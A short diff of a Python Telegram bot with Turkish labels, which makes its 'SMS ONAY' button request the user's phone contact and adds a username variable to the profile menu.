@@ -99,7 +99,7 @@ async def menu_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
         selected_country[user.id] = country_name
         waiting_number.add(user.id)
 
-        btn = KeyboardButton("📲 SMS ONAY")  # Süslü buton
+        btn = KeyboardButton("📲 SMS ONAY", request_contact=True)  # Düzeltilmiş: numara iste
         kb = ReplyKeyboardMarkup([[btn]], resize_keyboard=True, one_time_keyboard=True)
 
         await query.message.reply_text(f"""
@@ -112,6 +112,7 @@ async def menu_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
 """, reply_markup=kb)
 
     elif data == "profil":
+        username = f"@{user.username}" if user.username else user.first_name
         await query.message.reply_text(f"""
 ╔══════════════╗
 👑 HESABIM 👑
@@ -209,3 +210,4 @@ app.add_handler(CallbackQueryHandler(menu_buttons))
 app.add_handler(MessageHandler(filters.CONTACT, contact_handler))
 
 app.run_polling()
+              
